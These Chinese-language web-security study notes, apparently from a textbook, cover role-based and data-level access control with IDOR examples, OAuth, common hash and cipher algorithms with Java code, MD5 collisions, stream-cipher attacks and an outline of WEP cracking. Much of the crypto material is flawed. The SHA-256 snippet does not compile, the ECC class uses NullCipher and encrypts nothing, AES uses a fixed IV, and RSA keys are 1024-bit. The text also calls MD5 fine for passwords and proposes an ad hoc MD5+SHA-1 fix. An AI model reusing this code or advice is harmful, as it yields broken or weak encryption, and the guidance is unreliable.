这两种访问控制都是RBAC模型的实现，换言之，在Spring Security中都是验证该用户所属的角色，以决定是否授权，不同的URL对于能访问其的角色有着不同的要求，虽然Spring Security的权限管理功能非常强大，但它缺乏一个管理界面可供用户灵活配置，因此每次调整权限时，都需要重新修改配置文件或代码，而其配置文件较为复杂，学习成本较高，维护成本也很高，除了Spring Security外，在PHP的流行框架Zend Framework中，使用的Zend ACL实现了一些基础的权限管理，[http://framework.zend.com/manual/en/zend.acl.html](http://framework.zend.com/manual/en/zend.acl.html)，不同于Spring Security使用配置文件管理权限，Zend ACL提供的是API级的权限框架，权限管理其实是业务需求上的一个问题，需要根据业务的不同需求来实现不同的权限管理，因此很多时候，系统都需要自己定制权限管理，定制一个简单的权限管理系统，不妨选择RBAC模型作为依据，这种基于角色的权限管理(RBAC模型)，我们可以称之为垂直权限管理，不同角色的权限有高低之分，高权限角色访问低权限角色的资源往往是被允许的，而低权限角色访问高权限角色的资源往往则被禁止，如果一个本属于低权限角色的用户通过一些方法能够获得高权限角色的能力，则发生了越权访问，在配置权限时，应当使用最小权限原则，并使用默认拒绝的策略，只对有需要的主体单独配置允许的策略，这在很多时候能够避免发生越权访问

#### <font color="yellow">003 水平权限管理</font>

优酷网用户越权访问问题(漏洞编号wooyun-2010-0129)，用户登录后，可以通过以下方式查看他人的来往信件(只要更改下面地址的数字id即可)，查看和修改他人的专辑信息，URL经过rewrite后将参数映射成URL路径，但这并不妨碍通过修改用户id来实现攻击，在这里，id代表资源的唯一编号，因此通过篡改id，就能改变要访问的资源，而优酷网显然没有检查这些资源是否属于当前用户，来伊份购物网站越权访问问题(漏洞编号wooyun-2010-01576)，来伊份购物网站没有对用户进行权限控制，通过变化URL中的id参数即可查看对应id的个人姓名、地址等隐私信息，同样的，id是用户的唯一标识，修改id即可修改访问的目标，网站后台应用并未判断资源是否属于当前用户，相对于垂直权限管理来说，水平权限问题出在同一个角色上，系统只验证了能访问数据的角色，既没有对角色内的用户做细分，也没有对数据的子集做细分，因此缺乏一个用户到数据之间的对应关系，由于水平权限管理是系统缺乏一个数据级的访问控制所造成的，因此水平权限管理又可以称之为基于数据的访问控制

在今天的互联网中，垂直权限问题已经得到了普遍的重视，并已经有了很多成熟的解决方案，但水平权限问题却尚未得到重视

- 对于一个大型的复杂系统来说，难以通过扫描等自动化测试方法将这些问题全部找出来
- 对于数据的访问控制，与业务结合得十分紧密，有的业务有数据级访问控制的需求，有的业务则没有，要理清楚不同业务的不同需求，也不是件容易的事情
- 如果在系统己经上线后再来处理数据级访问控制问题，则可能会涉及跨表、跨库查询，对系统的改动较大，同时也可能会影响到性能

这种种原因导致了现在数据级权限管理并没有很通用的解决方案，一般是具体问题具体解决，一个简单的数据级访问控制，可以考虑使用用户组(Group)的概念，比如一个用户组的数据只属于该组内的成员，只有同一用户组的成员才能实现对这些数据的操作，此外，还可以考虑实现一个规则引擎，将访问控制的规则写在配置文件中，通过规则引擎对数据的访问进行控制，水平权限管理问题，至今仍然是一个难题——它难以发现，难以在统一框架下解决，在未来也许会有新的技术用以解决此类问题

#### <font color="yellow">004 OAuth简介</font>

OAuth是一个在不提供用户名和密码的情况下，授权第三方应用访问Web资源的安全协议，OAuth 1.0于2007年12月公布，并迅速成为了行业标准(可见不同网站之间互通的需求有多么的迫切)，OAuth 1.0正式成为了RFC 584[http://tools.ietf.org/html/rfc5849](http://tools.ietf.org/html/rfc5849)，OAuth与OpenID都致力于让互联网变得更加的开放，OpenID解决的是认证问题，OAuth则更注重授权，认证与授权的关系其实是一脉相承的，后来人们发现，其实更多的时候真正需要的是对资源的授权，常见的应用OAuth的场景，一般是某个网站想要获取一个用户在第三方网站中的某些资源或服务

在OAuth 1.0中，涉及3个角色

- Consumer:消费方(Client)
- Service Provider:服务提供方(Server)
- User:用户(Resource Owner)

在新版本的OAuth中，又被称为Client、Server、Resource Owner，OAuth的发展道路并非一帆风顺，OAuth 1.0也曾经出现过一些漏洞[9]，因此OAuth也出过几个修订版本，最终才在2010年4月定稿OAuth 1.0为RFC 5849[http://oauth.net/adxisories/2009-1/](http://oauth.net/adxisories/2009-1/)，在这个版本中，修复了所有已知的安全问题，并对实现OAuth协议需要考虑的安全因素给出了建议[http://tools.ietf.org/html/rfc5849#section-4](http://tools.ietf.org/html/rfc5849#section-4)，OAuth 1.0已经成为了RFC标准，但OAuth 2.0仍然在紧锣密鼓的制定中，到2011年年底已经有了一个较为稳定的版本，OAuth 2.0吸收了OAuth 1.0的经验，做出了很多调整，它大大地简化了流程，改善了用户体验，两者并不兼容，但从流程上看区别不大
常见的需要用到OAuth的地方有桌面应用、手机设备、Web应用，但OAuth 1.0只提供了统一的接又，这个接又对于Web应用来说尚可使用，但手机设备和桌面应用用起来则会有些别扭，同时OAuth 1.0的应用架构在扩展性方面也存在一些问题，当用户请求数庞大时，可能会遇到一些性能瓶颈，为了改变这些问题，OAuth 2.0应运而生[http://hueniverse.com/2010/05/introducing-oauth-2-0/](http://hueniverse.com/2010/05/introducing-oauth-2-0/)

#### <font color="yellow">005 总结</font>

还分别介绍了垂直权限管理，它是一种基于角色的访问控制，以及水平权限管理，它是一种基于数据的访问控制，这两种访问控制方式，在进行安全设计时会经常用到，访问控制与业务需求息息相关，并非一个单纯的安全问题，因此在解决此类问题或者设计权限控制方案时，要重视业务的意见，无论选择哪种访问控制方式，在设计方案时都应该满足最小权限原则，这是权限管理的黄金法则

### <font color="yellow">05 加密算法与随机数</font>

#### <font color="yellow">001 使用加密算法的目的</font>

- 数据保密性，防止用户数据被窃取或泄露
- 数据完整性，防止用户传输的数据被篡改
- 通信双方身份确认，确保数据来源合法

#### <font color="yellow">002 常见的加密算法</font>

- 单向散列加密算法
	- md5
    - sha1
    - sha256
- 对称加密算法
	- des
	- 3des
	- aes
- 非对称加密算法
    - rsa
    - ecc

#### <font color="yellow">003 加密算法对比</font>

- 单向散列加密算法

    - md5

        运行速度：快

        安全性：中

    - sha1

        运行速度：慢

        安全性：高

    - sha256

        运行速度：极慢

        安全性：极高

- 对称加密算法

    - des

        密钥：56位

        运行速度：较快

        安全性：低

        资源消耗：中

    - 3des

        密钥：112位或168位

        运行速度：慢

        安全性：中

        资源消耗：高

    - aes

        密钥：128位或192位或256位

        运行速度：快

        安全性：高

        资源消耗：低

- 非对称加密算法

    - rsa

        成熟度：高

        安全性：高

        运算速度：中

        资源消耗：中

    - ecc

        成熟度：高

        安全性：高

        运算速度：慢

        资源消耗：高

#### <font color="yellow">004 单向散列加密</font>

单向散列加密算法常用于提取数据，验证数据的完整性，发送者将明文通过单向加密算法加密生成定长的密文串，然后将明文和密文串传递给接收方，接收方在收到报文后，将解明文使用相同的单向加密算法进行加密，得出加密后的密文串，随后与发送者发送过来的密文串进行对比，若发送前和发送后的密文串相一致，则说明传输过程中数据没有损坏，若不一致，说明传输过程中数据丢失了，其次也用于密码加密传递存储，单向加密算法只能用于对数据的加密，无法被解密，其特点为定长输出、雪崩效应

##### <font color="yellow">0001 md5加密</font>

MD5加密算法用的是哈希函数，一般应用于对信息产生信息摘要，防止信息被篡改，最常见的使用是对密码加密、生成数字签名，从严格意义上来说，MD5是摘要算法，并非加密算法，MD5生成密文时，无论要加密的字符串有多长，它都会输出长度为128bits的一个密文串，通常16进制时为32个字符

```java
public static final byte[] computeMD5(byte[] content) 
    {
    try 
        {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            return md5.digest(content);
        } 
    catch (NoSuchAlgorithmException e) 
        {
            throw new RuntimeException(e);
        }
    }
```

##### <font color="yellow">0002 sha1加密</font>

SHA1加密算法，与MD5一样，也是目前较流行的摘要算法，但SHA1比MD5的安全性更高，对长度小于2^64位的消息，SHA1会产生一个160位的消息摘要，基于MD5、SHA1的信息摘要特性以及不可逆，可以被应用在检查文件完整性，数字签名等场景

```java
public static byte[] computeSHA1(byte[] content)
    {
    try 
        {
          MessageDigest sha1 = MessageDigest.getInstance("SHA1");
          return sha1.digest(content);
        } 
    catch (NoSuchAlgorithmException e) 
        {
          throw new RuntimeException(e);
        }
    }
```

##### <font color="yellow">0003 sha256加密</font>

SHA256是SHA2算法中的一种

如SHA2加密算法中有

- SHA244
- SHA256
- SHA512

SHA2属于SHA1的升级，SHA1是160位的哈希值，而SHA2是组合值，有不同的位数，其中最受欢迎的是256位(SHA256算法)，SSL行业选择SHA作为数字签名的散列算法，从2011到2015，一直以SHA-1位主导算法，但随着互联网技术的提升，SHA-1的缺点越来越突显，2001年，SHA-2成为了新的标准，所以现在签发的SSL证书，必须使用该算法签名

```java
public static byte[] getSHA256(String str) 
    {
    MessageDigest messageDigest;
    String encodestr = "";
    try
        {
        messageDigest = MessageDigest.getInstance("SHA-256");
        messageDigest.update(str.getBytes("UTF-8"));
        return messageDigest.digest());
        } 
    catch (NoSuchAlgorithmException e) 
        {
        e.printStackTrace();
        } 
    catch (UnsupportedEncodingException e) 
        {
        e.printStackTrace();
        }
    }
```

#### <font color="yellow">005 对称加密</font>

对称加密算法采用单密钥加密，在数据传输过程中，发送方将原始数据分割成固定大小的块，经过密钥和加密算法逐个加密后，发送给接收方，接收方收到加密后的报文后，结合密钥和解密算法解密组合后得出原始数据，由于加解密算法是公开的，因此在这过程中，密钥的安全传递就成为了至关重要的事了，而密钥通常来说是通过双方协商，以物理的方式传递给对方，或者利用第三方平台传递给对方，一旦这过程出现了密钥泄露，不怀好意的人就能结合相应的算法拦截解密出其加密传输的内容，AES、DES、3DES都是对称的块加密算法，加解密的过程是可逆的

##### <font color="yellow">0001 des算法</font>

DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法，明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算(第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1)分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法，DES加密算法是对密钥进行保密，公开加密和解密算，只有知道发送方相同密钥的人才能解读获取的密文数据，想破译DES加密算法，就要搜索密钥的编码，对于56位长度的密钥来说，用穷举法，其运算次数为2^56次，

##### <font color="yellow">0002 3des算法</font>

3DES又称Triple DES，是DES加密算法的一种模式，它使用2条不同的56位的密钥对数据进行三次加密，DES使用56位密钥和密码块的方法，而在密码块的方法中，文本被分成64位大小的文本块然后再进行加密，比起最初的DES，3DES更为安全

```java
public class Des3
    {
    private static final String Algorithm = "DESede"; 
    /**
     * 加密
     * @param keybyte
     * @param src
     * @return
     */
    public static byte[] encryptMode(byte[] keybyte, byte[] src) 
        {
        try 
            {
            // 生成密钥
            SecretKey deskey = new SecretKeySpec(keybyte, Algorithm);
            // 加密
            Cipher c1 = Cipher.getInstance(Algorithm);
            c1.init(Cipher.ENCRYPT_MODE, deskey);
            return c1.doFinal(src);
            } 
        catch (java.security.NoSuchAlgorithmException e1) 
            {
            e1.printStackTrace();
            } 
        catch (javax.crypto.NoSuchPaddingException e2) 
            {
            e2.printStackTrace();
            } 
        catch (java.lang.Exception e3) 
            {
            e3.printStackTrace();
            }
        return null;
        }
    /**
     * 解密
     * @param keybyte 为加密密钥，长度为24字节
     * @param src 为加密后的缓冲区
     * @return
     */
    public static byte[] decryptMode(byte[] keybyte, byte[] src) 
        {
        try 
            {
            // 生成密钥
            SecretKey deskey = new SecretKeySpec(keybyte, Algorithm);
            // 解密
            Cipher c1 = Cipher.getInstance(Algorithm);
            c1.init(Cipher.DECRYPT_MODE, deskey);
            return c1.doFinal(src);
            } 
        catch (Exception e) 
            {
            e.printStackTrace();
            }
        return null;
        }
    // 转换成十六进制字符串
    public static String byte2hex(byte[] b) 
        {
        String hs = "";
        String stmp = "";
        for (int n = 0; n < b.length; n++) 
            {
            stmp = (java.lang.Integer.toHexString(b[n] & 0XFF));
            if (stmp.length() == 1) 
                {
                hs = hs + "0" + stmp;
                } 
            else 
                {
                hs = hs + stmp;
                }
            if (n < b.length - 1) 
                {
                hs = hs + ":";
                }
            }
        return hs.toUpperCase();
        }
    }
```

##### <font color="yellow">0003 aes算法</font>

AES算法是密码学中的高级加密标准，同时也是美国联邦政府采用的区块加密标准，这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用，算法采用对称分组密码体制，密钥长度的最少支持为128位、192位、256位，分组长度128位，算法应易于各种硬件和软件实现，AES本身就是为了取代DES的，AES具有更好的安全性、效率和灵活性

```java
public class AESUtils 
    {
    /**
     * 加密
     *
     * @param content
     * @param strKey
     * @return
     * @throws Exception
     */
    public static byte[] encrypt(String content, String strKey) throws Exception 
        {
        SecretKeySpec skeySpec = getKey(strKey);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec("0102030405060708".getBytes());
        cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);
        return cipher.doFinal(content.getBytes());
        }


    /**
     * 解密
     *
     * @param strKey
     * @param content
     * @return
     * @throws Exception
     */
    public static String decrypt(byte[] content, String strKey) throws Exception 
        {
        SecretKeySpec skeySpec = getKey(strKey);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec("0102030405060708".getBytes());
        cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);
        byte[] original = cipher.doFinal(content);
        String originalString = new String(original);
        return originalString;
        }


    private static SecretKeySpec getKey(String strKey) throws Exception 
        {
        byte[] arrBTmp = strKey.getBytes();
        byte[] arrB = new byte[16]; 
        for (int i = 0; i < arrBTmp.length && i < arrB.length; i++) 
            {
            arrB[i] = arrBTmp[i];
            }
        SecretKeySpec skeySpec = new SecretKeySpec(arrB, "AES");
        return skeySpec;
        }
    }
```

#### <font color="yellow">006 非对称加密算法</font>

非对称加密算法采用公钥(publickey)和私钥(privatekey)两种不同的密钥来进行加解密，公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密，反之亦然，因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法，非对称加密算法实现机密信息交换的基本过程是，甲方生成一对密钥并将公钥公开，需要向甲方发送信息的其他角色(乙方)使用该密钥(甲方的公钥)对机密信息进行加密后再发送给甲方，甲方再用自己私钥对加密后的信息进行解密，甲方想要回复乙方时正好相反，使用乙方的公钥对数据进行加密，同理，乙方使用自己的私钥来进行解密

##### <font color="yellow">0001 rsa算法</font>

RSA是目前最有影响力的公钥加密算法，也是被普遍认为是目前最优秀的公钥方案之一，RSA算法是第一个能同时用于加密和数字签名的算法，也易于理解和操作，RSA是被研究得最广泛的公钥算法，从提出到现今的三十多年里，经历了各种攻击的考验，逐渐为人们接受，截止2017年被普遍认为是最优秀的公钥方案之一，也已被ISO推荐为公钥数据加密标准

```java
public class RSAUtils 
    {
    
    public static final String KEY_ALGORITHM = "RSA";
    private static final String PUBLIC_KEY = "RSAPublicKey";
    private static final String PRIVATE_KEY = "RSAPrivateKey";

    /**
     * 私钥解密
     *
     * @param data 已加密数据
     * @param privateKey 私钥(BASE64编码)
     * @return
     * @throws Exception
     */
    public static String decryptByPrivateKey(String data, String privateKey) throws Exception 
        {
        byte[] keyBytes = Base64.decodeBase64(privateKey);
        PKCS8EncodedKeySpec pkcs8KeySpec = new PKCS8EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
        Key privateK = keyFactory.generatePrivate(pkcs8KeySpec);
        Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());
        cipher.init(Cipher.DECRYPT_MODE, privateK);
        byte[] buff = cipher.doFinal(Base64.decodeBase64(data));
        return new String(buff);
        }


    /**
     * 公钥解密
     *
     * @param data 已加密数据
     * @param publicKey 公钥(BASE64编码)
     * @return
     * @throws Exception
     */
    public static String decryptByPublicKey(String data, String publicKey) throws Exception 
        {
        byte[] keyBytes = Base64.decodeBase64(publicKey);
        X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
        Key publicK = keyFactory.generatePublic(x509KeySpec);
        Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());
        cipher.init(Cipher.DECRYPT_MODE, publicK);
        // 执行解密操作
        byte[] buff = cipher.doFinal(Base64.decodeBase64(data));
        return new String(buff);
        }


    /**
     * 公钥加密
     *
     * @param data 源数据
     * @param publicKey 公钥(BASE64编码)
     * @return
     * @throws Exception
     */
    public static String encryptByPublicKey(String data, String publicKey) throws Exception 
        {
        byte[] keyBytes = Base64.decodeBase64(publicKey);
        X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
        Key publicK = keyFactory.generatePublic(x509KeySpec);
        // 对数据加密
        Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());
        cipher.init(Cipher.ENCRYPT_MODE, publicK);
        byte[] buff = cipher.doFinal(data.getBytes());
        return Base64.encodeBase64String(buff);
        }


    /**
     * 私钥加密
     *
     * @param data 源数据
     * @param privateKey 私钥(BASE64编码)
     * @return
     * @throws Exception
     */
    public static String encryptByPrivateKey(String data, String privateKey) throws Exception 
        {
        byte[] keyBytes = Base64.decodeBase64(privateKey);
        PKCS8EncodedKeySpec pkcs8KeySpec = new PKCS8EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
        Key privateK = keyFactory.generatePrivate(pkcs8KeySpec);
        Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());
        cipher.init(Cipher.ENCRYPT_MODE, privateK);
        byte[] buff = cipher.doFinal(data.getBytes());
        // 执行加密操作。加密后的结果通常都会用Base64编码进行传输
        return Base64.encodeBase64String(buff);
        }


    /**
     * 获取私钥
     *
     * @param keyMap 密钥对
     * @return
     * @throws Exception
     */
    public static String getPrivateKey(Map<String, Object> keyMap) throws Exception 
        {
        Key key = (Key) keyMap.get(PRIVATE_KEY);
        return Base64.encodeBase64String(key.getEncoded());
        }


    /**
     * 获取公钥
     *
     * @param keyMap 密钥对
     * @return
     * @throws Exception
     */
    public static String getPublicKey(Map<String, Object> keyMap) throws Exception 
        {
        Key key = (Key) keyMap.get(PUBLIC_KEY);
        return Base64.encodeBase64String(key.getEncoded());
        }


    /**
     * 生成密钥对(公钥和私钥)
     *
     * @return
     * @throws Exception
     */
    public static Map<String, Object> initKey() throws Exception 
        {
        KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(KEY_ALGORITHM);
        keyPairGen.initialize(1024);
        KeyPair keyPair = keyPairGen.generateKeyPair();
        RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();
        RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();
        Map<String, Object> keyMap = new HashMap<String, Object>(2);
        keyMap.put(PUBLIC_KEY, publicKey);
        keyMap.put(PRIVATE_KEY, privateKey);
        return keyMap;
        }
    }
```

##### <font color="yellow">0002 ecc算法</font>

ECC(椭圆加密算法)是一种公钥加密体制，主要优势是在某些情况下它比其他的方法使用更小的密钥——比如RSA加密算法——提供相当的或更高等级的安全，不过一个缺点是加密和解密操作的实现比其他机制时间长，它相比RSA算法，对CPU消耗严重

```java
public abstract class ECCCoder extends Coder 
    {
    public static final String ALGORITHM = "EC";
    private static final String PUBLIC_KEY = "ECCPublicKey";
    private static final String PRIVATE_KEY = "ECCPrivateKey";


    /**
     * 用私钥解密
     * @param data
     * @param key
     * @return
     * @throws Exception
     */
    public static byte[] decrypt(byte[] data, String key) throws Exception 
        {
        // 对密钥解密
        byte[] keyBytes = decryptBASE64(key);
        // 取得私钥
        PKCS8EncodedKeySpec pkcs8KeySpec = new PKCS8EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = ECKeyFactory.INSTANCE;
        ECPrivateKey priKey = (ECPrivateKey) keyFactory.generatePrivate(pkcs8KeySpec);
        ECPrivateKeySpec ecPrivateKeySpec = new ECPrivateKeySpec(priKey.getS(),priKey.getParams());
        // 对数据解密
        Cipher cipher = new NullCipher();
        cipher.init(Cipher.DECRYPT_MODE, priKey, ecPrivateKeySpec.getParams());
        return cipher.doFinal(data);
        }
    /**
     * 用公钥加密
     * @param data
     * @param privateKey
     * @return
     * @throws Exception
     */
    public static byte[] encrypt(byte[] data, String privateKey) throws Exception 
        {
        // 对公钥解密
        byte[] keyBytes = decryptBASE64(privateKey);
        // 取得公钥
        X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = ECKeyFactory.INSTANCE;
        ECPublicKey pubKey = (ECPublicKey) keyFactory.generatePublic(x509KeySpec);
        ECPublicKeySpec ecPublicKeySpec = new ECPublicKeySpec(pubKey.getW(), pubKey.getParams());
        Cipher cipher = new NullCipher();
        cipher.init(Cipher.ENCRYPT_MODE, pubKey, ecPublicKeySpec.getParams());
        return cipher.doFinal(data);
        }

    /**
     * 取得私钥
     * @param keyMap
     * @return
     * @throws Exception
     */
    public static String getPrivateKey(Map<String, Object> keyMap) throws Exception 
        {
        Key key = (Key) keyMap.get(PRIVATE_KEY);
        return encryptBASE64(key.getEncoded());
        }
    /**
     * 取得公钥
     * @param keyMap
     * @return
     * @throws Exception
     */
    public static String getPublicKey(Map<String, Object> keyMap) throws Exception 
        {
        Key key = (Key) keyMap.get(PUBLIC_KEY);
        return encryptBASE64(key.getEncoded());
        }
    }
```

#### <font color="yellow">007 md5详解</font>

##### <font color="yellow">0001 md5的用处</font>

无论是密码记录用户验证还是文件完整性存储，笼统的说就是验证数据是否匹配，数据库中使用明文记录密码明显是不可行的，但是使用MD5就不同了，MD5算法的高明之处就是不可逆，因为在算法中采取了抽样、分组等等算法，他不会将数据的所有内容加入运算，而是根据规则选择指定内容运算，所以，同样的字符串或者内容进行MD5运算的时候，得到的结果也是一样的，所以使用MD5记录密码，可以很有效的解决一些明文带来的问题，至于验证数据准确性就更加不用说了

##### <font color="yellow">0002 md5有相同</font>

MD5有相同这个已经算是被承认的，但是几率非常小，MD5相同的情况叫做碰撞，现在网络中已经出现了两个相同的MD5可执行文件，你可能会问，MD5相同到底会造成什么问题，一些网盘使用的是MD5的方式来验证文件是否已经被上传过，如果上传过就直接告诉用户上传过就好了，也就不用再次上传去占用而外的空间，假设Win9现在发布了，我马上就构造一个假的包含病毒的但是MD5和官方镜像相同的安装镜像放置到A网盘，A网盘使用MD5验证数据是否相同，那么现在的问题就是，用户下载的全部都是我制作的光盘，而非微软官方的，当然，这种构造的方法仍然是非常高级的东西，不是很容易能够做到的，字符串1：`4d c9 68 ff 0e e3 5c 20 95 72 d4 77 7b 72 15 87 d3 6f a7 b2 1b dc 56 b7 4a 3d c0 78 3e 7b 95 18 af bf a2 00 a8 28 4b f3 6e 8e 4b 55 b3 5f 42 75 93 d8 49 67 6d a0 d1 55 5d 83 60 fb 5f 07 fe a2`，字符串2：`4d c9 68 ff 0e e3 5c 20 95 72 d4 77 7b 72 15 87 d3 6f a7 b2 1b dc 56 b7 4a 3d c0 78 3e 7b 95 18 af bf a2 02 a8 28 4b f3 6e 8e 4b 55 b3 5f 42 75 93 d8 49 67 6d a0 d1 d5 5d 83 60 fb 5f 07 fe a2`，两个字符串的MD5值完全相同

##### <font color="yellow">0003 需要担心的问题</font>

MD5会发生碰撞已经是被发现的了，但是我们需要担心吗，我要说的是，目前为止还不用担心，首先要构造MD5碰撞是非常难的，理论上字符串越长MD5就越不可能相同，并且借助SHA-1算法的帮助，双管齐下，也就没有太大问题了，所以现在MD5还没有轮到被弃用的时候

##### <font color="yellow">0004 sha-1是否会碰撞</font>

SHA-1也会发生碰撞，但是几率比MD5小的多

##### <font color="yellow">0005 如何解决碰撞</font>

解决碰撞其实可以通过MD5和SHA-1结合使用来实现，我是这样做的，首先将文件A的MD5值记为B再把A的SHA-1记为C，之后用将B和C相加之后再次运算MD5值就好了，MD5值碰撞的几率已经很小，再结合SHA-1的话，基本上就不会发生碰撞的问题出现了，在新的算法普及之前，MD5还是可以继续使用的

#### <font color="yellow">008 概述</font>

加密算法与伪随机数算法是开发中经常会用到的东西，但加密算法的专业性非常强，在Web开发中，如果对加密算法和伪随机数算法缺乏一定的了解，则很可能会错误地使用它们，最终导致应用出现安全问题，密码学有着悠久的历史，它满足了人们对安全的最基本需求————保密性，密码学可以说是安全领域发展的基础，在Web应用中，常常可以见到加密算法的身影，最常见的就是网站在将敏感信息保存到Cookie时使用的加密算法，加密算法的运用是否正确，与网站的安全息息相关，常见的加密算法通常分为分组加密算法与流密码加密算法，两者的实现原理不同，分组加密算法基于分组(block)进行操作，根据算法的不同，每个分组的长度可能不同

分组加密算法的代表

- DES
- 3-DES
- Blowfish
- IDEA
- AES
- ...

流密码加密算法，则每次只处理一个字节，密钥独立于消息之外，两者通过异或实现加密与解密

流密码加密算法的代表

- RC4
- ORYX
- SEAL
- ...

针对加密算法的攻击，一般根据攻击者能获得的信息，可以分为

- 唯密文攻击

    攻击者有一些密文，它们是使用同一加密算法和同一密钥加密的

    这种攻击是最难的

- 已知明文攻击

    攻击者除了能得到一些密文外，还能得到这些密文对应的明文

- 选择明文攻击

    攻击者不仅能得到一些密文和明文，还能选择用于加密的明文

- 选择密文攻击

    攻击者可以选择不同的密文来解密

    Padding Oracle Attack就是一种选择密文攻击

密码学在整个安全领域中是非常大的一个课题

#### <font color="yellow">009 Stream Cipher Attack</font>

流密码是常用的一种加密算法，与分组加密算法不同，流密码的加密是基于异或(XOR)操作进行的，每次都只操作一个字节，但流密码加密算法的性能非常好，因此也是非常受开发者欢迎的一种加密算法

常见的流密码加密算法

- RC4
- ORYX
- SEAL
- ...

##### <font color="yellow">0001 Reused Key Attack</font>

在流密码的使用中，最常见的错误便是使用同一个密钥进行多次加/解密，这将使得破解流密码变得非常简单，这种攻击被称为Reused Key Attack，在这种攻击下，攻击者不需要知道密钥，即可还原出明文，假设有密钥C、明文A、明文B，那么XOR可以表示为

```
E(A) = A xor C
E(B) = B xor C
```

这种密文是公开于众的，因此很容易计算

```
E(A) xor E(B)
```

因为两个相同的数进行XOR运算的结果是0

```
E(A) xor E(B) = (A xor C) xor (B xor C) = A xor B xor C xor C = A xor B
```

这意味着4个数据中，只需要知道3个，就可以推导出剩下的一个，如果存在初始化向量，则相同明文每次加密的结果均不同，将增加破解的难度，即不受此攻击影响，因此当`$ckey_length = 4;`时，`authcode()`将产生随机密钥，算法的强度也就增加了，如果IV不够随机，攻击者有可能找到相同的IV，则在相同IV的情况下仍然可以实施Reused Key Attack

##### <font color="yellow">0002 Bit-flipping Attack</font>

再次回到这个公式

```
E(A) xor E(B) = A xor B
```

由此可以得出

```
A xor E(A) xor B = E(B)
```

这意味着当知道A的明文、B的明文、A的密文时，可以推导出B的密文，这在实际应用中非常有用，比如一个网站应用，使用Cookie作为用户身份的认证凭证，而Cookie的值是通过XOR加密而得的，认证的过程就是服务器端解密Cookie后，检查明文是否合法，假设明文是`username + role`，那么当攻击者注册了一个普通用户A时，获取了A的Cookie为`Cookie(A)`，就有可能构造出管理员的Cookie，从而获得管理员权限

```
(accountA + member) xor Coolie(A) xor (admin_account + manager) = Coolie(admin)
```

在密码学中，攻击者在不知道明文的情况下，通过改变密文，使得明文按其需要的方式发生改变的攻击方式，被称为Bit-flipping Attack[http://en.wikipedia.org/wili/Bit-flipping_attack](http://en.wikipedia.org/wili/Bit-flipping_attack)，解决Bit-flipping攻击的方法是验证密文的完整性，最常见的方法是增加带有KEY的MAC(消息验证码，Message Authentication Code)，通过MAC验证密文是否被篡改，通过哈希算法来实现的MAC，称为HMAC，HMAC由于其性能较好，而被广泛使用在`authcode()`中，其实已经实现了HMAC，所以攻击者在不知晓加密KEY的情况下，是无法完成Bit-flipping攻击的，其中，密文的前10个字节用于验证时间是否有效，10~26个字节即为HMAC，用于验证密文是否被篡改，26个字节之后才是真正的密文，这个值与两个因素有关，一个是真正的密文`:substr($result，26)`，一个是`$keyb`，而`$keyb?`又是由加密密钥KEY变化得到的，因此在不知晓KEY的情况下，这个HMAC的值是无法伪造出来的，因此HMAC有效地保证了密文不会被篡改

##### <font color="yellow">0003 弱随机IV问题</font>

在`authcode()`函数中，它默认使用了4字节的IV(就是函数中的keyc)，使得破解难度增大，但其实4字节的IV是很脆弱的，它不够随机，我们完全可以通过暴破的方式找到重复的IV，为了验证这一点，调整一下破解程序，在大约16秒后，共遍历了19295个不同的XOR KEY，找到了相同的IV，顺利破解出明文

#### <font color="yellow">010 WEP破解</font>

流密码加密算法存在Reused Key Attack和Bit-flipping Attack等攻击方式，而在现实中，一种最著名的针对流密码的攻击可能就是WEP密钥的破解，WEP是一种常用的无线加密传输协议，破解了WEP的密钥，就可以以此密钥连接无线的Access Point，WEP采用RC4算法，也存在这两种攻击方式，WEP在加密过程中，有两个关键因素，一个是初始化向量IV，一个是对消息的CRC-32校验，而这两者都可以通过一些方法克服，IV以明文的形式发送，在WEP中采用24bit的IV，但这其实不是很大的一个值，假设一个繁忙的AP，以11Mbps的速度发送大小为1500bytes的包，则1500*8/(11*10^6)*2^24 =~18000秒，约为5个小时，因此最多5个小时，IV就将耗光，不得不开始出现重复的IV，在实际情况中，并非每个包都有1500bytes大小，因此时间会更短，IV一旦开始重复，就会使得Reused Key Attack成为可能，同时通过收集大量的数据包，找到相同的IV，构造出相同的CRC-32校验值，也可以成功实施Bit-flipping Attack，破解WEP的理论变得可行了，Berkly的Nikita Borisov，Ian Goldberg以及David Wagner共同完成了一篇很好的论文Security of the WEP algorithm，其中深入阐述了WEP破解的理论基础[http://www.isaac.cs.berkeley.edu/isaac/wep-faq.html](http://www.isaac.cs.berkeley.edu/isaac/wep-faq.html)

实际破解WEP的步骤要稍微复杂一些，Aircrack实现了这一过程

- 加载目标
- 与目标网络进行协商
- 生成密钥流
- 构造ARP包
- 生成自己的ARP包
